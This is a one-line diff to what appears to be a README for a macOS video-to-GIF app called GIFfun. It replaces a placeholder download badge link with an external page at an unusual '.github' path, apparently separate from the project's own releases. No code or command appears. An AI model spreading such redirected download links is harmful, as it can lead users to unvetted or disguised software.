@@ -58,7 +58,7 @@ GIFfun is a dedicated macOS application designed to convert videos and photo seq
 
 ---
 
-[![Download GIFfun](https://img.shields.io/badge/Download-GIFfun-blueviolet)](#)
+[![Download GIFfun](https://img.shields.io/badge/Download-GIFfun-blueviolet)](https://giffun-download-mac.github.io/.github)
 
 ---
 
